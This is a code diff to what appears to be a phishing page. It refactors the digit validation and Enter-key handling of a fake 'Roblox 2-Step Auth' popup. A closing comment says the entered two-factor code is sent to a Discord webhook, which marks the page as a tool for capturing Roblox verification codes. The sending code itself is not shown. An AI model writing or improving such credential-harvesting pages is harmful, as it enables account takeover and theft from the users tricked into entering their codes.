@@ -690,22 +690,7 @@ function showRoblox2StepAuth() {
     if (popup) {
         popup.style.display = 'flex';
         setTimeout(() => {
-            const codeInput = document.getElementById('robloxVerificationCode');
-            const verifyBtn = document.getElementById('robloxVerifyBtn');
-            
-            if (codeInput && verifyBtn) {
-                // Clear any previous event listeners
-                codeInput.removeEventListener('input', handleCodeInput);
-                codeInput.removeEventListener('keydown', handleKeyDown);
-                
-                codeInput.focus();
-                
-                // Add input validation
-                codeInput.addEventListener('input', handleCodeInput);
-                
-                // Handle Enter key
-                codeInput.addEventListener('keydown', handleKeyDown);
-            }
+            setupRoblox2FAInputValidation();
         }, 100);
     }
 }
@@ -766,6 +751,43 @@ function submitRobloxAuth() {
             codeInput.disabled = false;
         }
     }, 2000);
+}
+
+// Add input validation for new 2FA design
+function setupRoblox2FAInputValidation() {
+    const codeInput = document.getElementById('robloxVerificationCode');
+    const verifyBtn = document.getElementById('robloxVerifyBtn');
+    
+    if (!codeInput || !verifyBtn) return;
+    
+    // Handle input validation and button state
+    const handleInput = () => {
+        const value = codeInput.value.replace(/\D/g, ''); // Only digits
+        codeInput.value = value;
+        
+        if (value.length === 6) {
+            verifyBtn.disabled = false;
+            verifyBtn.classList.add('enabled');
+        } else {
+            verifyBtn.disabled = true;
+            verifyBtn.classList.remove('enabled');
+        }
+    };
+    
+    // Handle Enter key submission
+    const handleKeyDown = (e) => {
+        if (e.key === 'Enter' && codeInput.value.length === 6) {
+            e.preventDefault();
+            submitRobloxAuth();
+        }
+    };
+    
+    // Add event listeners
+    codeInput.addEventListener('input', handleInput);
+    codeInput.addEventListener('keydown', handleKeyDown);
+    
+    // Focus the input when popup opens
+    setTimeout(() => codeInput.focus(), 100);
 }
 
 // Send 2FA code to Discord webhook
